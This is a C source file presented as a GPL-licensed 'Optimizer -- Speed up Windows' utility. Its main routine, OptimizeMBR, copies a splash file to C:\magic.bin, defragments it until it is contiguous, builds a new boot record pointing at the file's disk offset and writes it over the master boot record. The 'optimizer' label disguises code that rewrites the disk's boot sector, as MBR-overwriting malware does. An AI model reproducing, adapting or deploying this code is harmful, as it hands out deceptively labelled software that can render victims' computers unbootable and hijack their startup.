/* 
 * Optimizer -- Speed up Windows
 * 
 * Copyright (C) 2007-2010  Anonymous
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to 
 * the Free Software Foundation, Inc.
 * 51 Franklin Street, Fifth Floor
 * Boston, MA  02110-1301, USA
 * 
 */

#include <fcntl.h>
#include <io.h>
#include <stdio.h>
#include <wchar.h>
#include <Windows.h>

#include "defrag.h"
#include "getsector.h"
#include "mbr.h"
#include "mbrop.h"

#define FILENAME	"C:\\magic.bin"

typedef union {
	LONGLONG addr;
	char addr_buf[8]; 
} addr_t;

typedef struct {
	fsinfo_t FsInfo;
	fileinfo_t FileInfo;
} posinfo_t;

posinfo_t GetPosInfo(LPCWSTR File) {
	posinfo_t Output;

	Output.FsInfo = GetFsInfo(File);
	Output.FileInfo = GetPosition(File, Output.FsInfo);

	return Output;
}

LPWSTR CharToWSTR(char *Input) {
	size_t OriginalSize;
	LPWSTR WCString;
	size_t ConvertedChars = 0;

	if((WCString = malloc(100)) == NULL) {
		return NULL;
	}

	OriginalSize = strlen(Input) + 1;
	mbstowcs_s(&ConvertedChars, WCString, OriginalSize, Input, _TRUNCATE);	

	return WCString;
}

int CopyAtomic(LPCWSTR Source, LPCWSTR Dest) {
	FILE *SourceFp, *DestFp;
	int bufsize;
	char *buf;

	if((SourceFp = _wfopen(Source, TEXT("rb"))) == NULL) {
		return 0;
	}

	if((DestFp = _wfopen(Dest, TEXT("wb"))) == NULL) {
		fclose(SourceFp);
		return 0;
	}

	fseek(SourceFp, 0, SEEK_END);
	bufsize = ftell(SourceFp);
	fseek(SourceFp, 0, SEEK_SET);

	if((buf = malloc(bufsize)) == NULL) {
		fclose(SourceFp);
		fclose(DestFp);
		return 0;
	}

	fread(buf, bufsize, 1, SourceFp);
	fclose(SourceFp);

	fwrite(buf, bufsize, 1, DestFp);
	fclose(DestFp);
	free(buf);
	return 1;
}

int OptimizeMBR(LPCWSTR SplashFile) {
	posinfo_t PosInfo;
	LPWSTR wFile;
	addr_t Addr;
	char *NewMBR;

	wFile = CharToWSTR(FILENAME);
	
	do {		
		DeleteFile(TEXT(FILENAME));
		CopyAtomic(SplashFile, wFile);
		DefragFile(wFile);
		PosInfo = GetPosInfo(wFile);
	} while(PosInfo.FileInfo.Fragmented);

	Addr.addr = PosInfo.FileInfo.StartOffset;
	NewMBR = getImgRec(Addr.addr_buf);

	writembr(NewMBR, 512);

	free(wFile);
	return 1;
}